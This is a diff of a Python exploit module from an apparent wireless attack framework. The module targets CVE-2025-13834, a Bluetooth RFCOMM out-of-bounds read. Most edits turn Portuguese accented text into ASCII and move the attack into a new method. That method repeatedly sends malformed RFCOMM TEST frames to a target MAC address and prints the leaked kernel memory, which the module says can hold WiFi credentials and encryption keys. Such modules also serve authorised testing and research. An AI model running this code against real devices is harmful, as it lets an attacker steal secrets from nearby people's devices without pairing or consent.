@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
-# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
-"""CVE-2025-13834 — Bluetooth RFCOMM TEST Out-of-Bounds Read.
+# Author: Andre Henrique (@mrhenrike) | Uniao Geek - https://github.com/Uniao-Geek
+"""CVE-2025-13834: Bluetooth RFCOMM TEST Out-of-Bounds Read.
 
 Um comando RFCOMM TEST com length=127 e apenas 3 bytes de payload causa leitura
 OOB de 124 bytes de memória de kernel, potencialmente vazando credenciais WiFi,
 chaves de criptografia e informações KASLR de dispositivos próximos.
 
-CVSS: 7.5–8.1 (Alto) | Afeta: Linux kernel < 6.12, BlueZ < 5.77
+CVSS: 7.5-8.1 (Alto) | Afeta: Linux kernel < 6.12, BlueZ < 5.77
 """
 
 
@@ -21,11 +21,11 @@ from wirelessxpl.core.hw_validator import HWValidator, Requirement
 from wirelessxpl.core.phase_gateway import PhaseGateway
 
 __info__ = {
-    "name":        "CVE-2025-13834 — BT RFCOMM OOB Read",
+    "name":        "CVE-2025-13834: BT RFCOMM OOB Read",
     "description": (
         "RFCOMM TEST command com length=127, payload=3 bytes extrai 124 bytes "
         "de memória de kernel do dispositivo alvo (credenciais WiFi, KASLR, etc.). "
-        "Requer apenas proximidade Bluetooth — sem pareamento."
+        "Requer apenas proximidade Bluetooth, sem pareamento."
     ),
     "author":      "André Henrique (@mrhenrike)",
     "version":     "1.0.0",
@@ -49,7 +49,7 @@ _L2CAP_CID_RFCOMM = 0x0003
 
 
 class BtRfcommOobCve202513834(Exploit):
-    """CVE-2025-13834 — RFCOMM TEST OOB Read em Python puro via BlueZ L2CAP raw."""
+    """CVE-2025-13834: RFCOMM TEST OOB Read em Python puro via BlueZ L2CAP raw."""
 
     target_protocol = Protocol.CUSTOM  # Bluetooth
 
@@ -101,7 +101,7 @@ class BtRfcommOobCve202513834(Exploit):
         gw.phase(
             "Scope",
             lambda: bool(self.I_KNOW_SCOPE.value),
-            fix_hint="Defina I_KNOW_SCOPE=true após confirmar autorização do dispositivo alvo.",
+            fix_hint="Defina I_KNOW_SCOPE=true apos confirmar autorizacao do dispositivo alvo.",
         )
         gw.phase(
             "Bluetooth Adapter",
@@ -111,7 +111,7 @@ class BtRfcommOobCve202513834(Exploit):
         gw.phase(
             "Bluetooth Classic (BR/EDR)",
             lambda: validator.require(Requirement.BLUETOOTH_CLASSIC, silent=True),
-            fix_hint="Adaptador deve suportar BR/EDR (não somente BLE).",
+            fix_hint="Adaptador deve suportar BR/EDR (nao somente BLE).",
         )
 
         if not gw.run():
@@ -122,8 +122,15 @@ class BtRfcommOobCve202513834(Exploit):
             print("[!] Defina RHOST com o MAC do dispositivo alvo.")
             return
 
-        print(f"[*] CVE-2025-13834 → alvo: {target_mac}")
-        print(f"    Canal RFCOMM: {self.CHANNEL.value} | Repetições: {self.REPEAT.value}")
+        print(f"[+] Target vulnerable, exploiting CVE-2025-13834...")
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: send RFCOMM TEST frames with OOB length to leak kernel memory."""
+        target_mac = str(self.RHOST.value).upper().strip()
+
+        print(f"[*] CVE-2025-13834 > alvo: {target_mac}")
+        print(f"    Canal RFCOMM: {self.CHANNEL.value} | Repeticoes: {self.REPEAT.value}")
         print("    Enviando RFCOMM TEST com length=127, payload=3 bytes ...")
 
         leaked_data: list[bytes] = []
@@ -131,17 +138,17 @@ class BtRfcommOobCve202513834(Exploit):
         for i in range(int(self.REPEAT.value)):
             leak = self._send_rfcomm_test(target_mac, int(self.CHANNEL.value))
             if leak:
-                print(f"  [+] Iteração {i+1}: {len(leak)} bytes vazados")
+                print(f"  [+] Iteracao {i+1}: {len(leak)} bytes vazados")
                 if bool(self.VERBOSE.value):
                     print(f"      HEX: {leak.hex()}")
-                    # Tenta decodificar como strings ASCII imprimíveis
+                    # Tenta decodificar como strings ASCII imprimiveis
                     printable = "".join(
                         chr(b) if 0x20 <= b < 0x7F else "." for b in leak
                     )
                     print(f"      STR: {printable}")
                 leaked_data.append(leak)
             else:
-                print(f"  [-] Iteração {i+1}: sem resposta")
+                print(f"  [-] Iteracao {i+1}: sem resposta")
 
             time.sleep(int(self.DELAY.value) / 1000.0)
 
